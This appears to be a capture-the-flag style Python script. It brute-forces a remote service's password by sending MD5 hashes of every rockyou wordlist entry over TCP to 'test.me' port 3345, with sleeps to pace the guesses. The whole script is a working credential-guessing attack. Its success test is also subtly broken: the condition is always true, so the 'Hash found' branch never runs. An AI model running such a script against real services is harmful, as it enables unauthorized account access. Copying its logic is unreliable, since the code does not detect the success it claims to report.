#!/usr/bin/python3.7
# -*- coding: utf-8 -*-

import socket, hashlib, time

hote = "test.me"
port = 3345

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((hote, port))
print("Connection on ", hote, "{}".format(port), "\n")

reponse = socket.recv(2048)
print(reponse.decode())

with open('/usr/share/wordlists/rockyou.txt', mode='rb') as fp:
	for i in fp.readlines():
		enc = hashlib.md5(i.rstrip(b"\n")).hexdigest().encode() + b"\n"
		print(enc)
		try:
			time.sleep(1)
			socket.send(enc)
			reponse = socket.recv(2048)

			if "Please enter your password" or "Incorrect password." not in reponse.decode():
				print(reponse.decode())

			else:
				print("Hash found ! ", enc)
				print("Close")
				socket.close()

		except:
			time.sleep(120)
			print("OWned!")

print("Not found !")
socket.close()

